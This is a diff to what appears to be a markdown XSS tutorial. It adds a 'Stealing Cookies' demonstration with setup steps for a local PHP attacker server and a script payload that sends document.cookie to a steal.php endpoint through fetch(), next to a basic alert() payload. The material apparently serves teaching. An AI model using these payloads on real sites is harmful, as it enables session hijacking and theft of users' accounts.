@@ -16,6 +16,18 @@ Payload
 <script>alert('Hacked!')</script>
 ```
 
+Further Demonstration: Stealing Cookies
+
+> [!WARNING]
+> Need to run the attacker server  
+> Attacker File `C:\xampp\htdocs\attacker`
+> Run the php attack server `C:\xampp\php\php -S 127.0.0.1:8000`
+> Access the Server: `http://localhost:8000/steal.php`
+
+```bash
+<script> fetch('http://localhost:8000/steal.php?cookie=' + document.cookie); </script>	
+```
+
 ### DOM-based XSS
 
 Payload: 
